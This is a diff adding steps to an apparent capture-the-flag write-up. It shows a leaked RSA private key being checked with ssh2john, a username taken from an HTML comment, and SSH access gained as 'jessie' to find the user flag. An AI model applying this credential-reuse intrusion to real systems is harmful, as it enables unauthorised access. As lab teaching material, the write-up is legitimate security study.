@@ -113,3 +113,41 @@ QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
 jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
 -----END RSA PRIVATE KEY-----
 ```
+
+- I used ```vi``` to save this as ```id_rsa```
+
+6. We can use john to see if there is any password for this id_rsa.
+```bash
+/usr/share/john/ssh2john.py id_rsa
+```
+- You will noticed that there is no password for this private rsa key
+```
+root@kali:~# /usr/share/john/ssh2john.py id_rsa
+id_rsa has no password!
+```
+
+7. Now we will need to find the user of the private rsa key.
+- This took me a long time... But you will realised under the dev console for http://10.10.37.40 there is a comment.
+```
+<!--Jessie don't forget to udate the webiste-->
+```
+
+8. Lets try ssh using ```jessie``` as the user to see if can gain any access.
+```bash
+#make sure that the id_rsa can only be read by you.
+chmod 600 id_rsa
+
+#ssh into jessie
+ssh -i id_rsa jessie@10.10.37.40
+```
+
+- You will gain access into ```jessie``` account. Now to find the user flag.
+```bash
+jessie@CorpOne:~$ find . -name user*
+./.local/share/keyrings/user.keystore
+./.config/user-dirs.locale
+./.config/user-dirs.dirs
+./.config/dconf/user
+./Documents/user_flag.txt
+jessie@CorpOne:~$ 
+```
